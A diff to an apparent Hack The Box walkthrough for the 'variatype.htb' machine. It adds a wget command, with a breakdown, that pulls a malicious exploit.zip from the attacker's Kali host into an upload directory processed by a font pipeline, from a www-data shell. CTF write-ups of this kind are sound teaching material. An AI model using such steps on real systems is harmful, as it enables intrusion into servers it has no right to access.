@@ -1857,7 +1857,21 @@ print(f"Created exploit.zip with filename: {exploit_filename}")
 
 #### 4.3.3 Transfer the Exploit to the Target
 
-Once the server is running on your Kali machine, return to the **www-data** shell on the target and re-run the `wget` command.
+Once the server is running on your Kali machine, return to the **www-data** shell on the target and run this command.
+
+**Command:** `wget http://10.10.14.71/exploit.zip -O /var/www/portal.variatype.htb/public/files/exploit.zip`
+
+**Breakdown:**
+
+- `wget`
+    - **Description:** Non-Interactive Network Downloader.
+    - **Purpose:** Downloads the malicious archive from the attacker's machine.
+- `http://10.10.14.71/exploit.zip`
+    - **Description:** Source URL.
+    - **Purpose:** The address of the file hosted on your Kali machine.
+- `-O /var/www/.../exploit.zip`
+    - **Description:** Output File Specification.
+    - **Purpose:** Forces the file to be saved in the specific upload directory monitored by the font-processing pipeline.
 <div align="center">
 <br>
 <br>
